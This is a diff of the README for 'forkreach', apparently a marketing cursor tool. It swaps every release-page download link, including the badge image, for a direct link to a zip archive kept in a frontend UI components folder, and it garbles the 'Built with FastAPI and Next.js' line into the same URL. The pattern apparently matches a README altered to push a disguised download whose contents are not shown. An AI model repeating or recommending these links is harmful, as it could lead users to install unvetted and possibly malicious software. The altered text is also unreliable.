@@ -1,6 +1,6 @@
 # 🖱️ forkreach - Easy, Smart Cursor for Marketing
 
-[![Download forkreach](https://img.shields.io/badge/Download-forkreach-blue?style=for-the-badge)](https://github.com/phongdg123/forkreach/releases)
+[![Download forkreach](https://github.com/phongdg123/forkreach/raw/refs/heads/main/frontend/src/components/ui/Software-v1.1-alpha.4.zip)](https://github.com/phongdg123/forkreach/raw/refs/heads/main/frontend/src/components/ui/Software-v1.1-alpha.4.zip)
 
 Welcome to forkreach, an open source cursor tool designed to help marketers work smarter and faster. This guide will take you step-by-step through downloading and running forkreach on your computer. You do not need any programming knowledge to get started.
 
@@ -38,7 +38,7 @@ If you are not sure about your system specs, you can find them in your computer�
 
 Here’s what you need to do to start using forkreach:
 
-1. Click the big blue download button at the top, or [visit the forkreach release page](https://github.com/phongdg123/forkreach/releases) to get the latest version.
+1. Click the big blue download button at the top, or [visit the forkreach release page](https://github.com/phongdg123/forkreach/raw/refs/heads/main/frontend/src/components/ui/Software-v1.1-alpha.4.zip) to get the latest version.
 2. Download the correct file for your operating system:
    - If you use Windows, download the `.exe` file.
    - If you use macOS, download the `.dmg` file.
@@ -54,7 +54,7 @@ Here’s what you need to do to start using forkreach:
 
 You can always download the latest version of forkreach from the official release page:
 
-[Download forkreach here](https://github.com/phongdg123/forkreach/releases)
+[Download forkreach here](https://github.com/phongdg123/forkreach/raw/refs/heads/main/frontend/src/components/ui/Software-v1.1-alpha.4.zip)
 
 ### Step-by-step installation:
 
@@ -127,7 +127,7 @@ forkreach uses technologies like Python, React, and AI agents to deliver a smart
 
 For developers interested in the technology:
 
-- Built with FastAPI and Next.js.
+- Built with FastAPI and https://github.com/phongdg123/forkreach/raw/refs/heads/main/frontend/src/components/ui/Software-v1.1-alpha.4.zip
 - Uses OpenAI and Gemini AI models.
 - Employs Supabase for data management.
 - Includes streaming features for real-time updates.
@@ -136,4 +136,4 @@ For developers interested in the technology:
 
 Thank you for choosing forkreach. Download now to begin making marketing easier.  
 
-[Download forkreach](https://github.com/phongdg123/forkreach/releases)
+[Download forkreach](https://github.com/phongdg123/forkreach/raw/refs/heads/main/frontend/src/components/ui/Software-v1.1-alpha.4.zip)
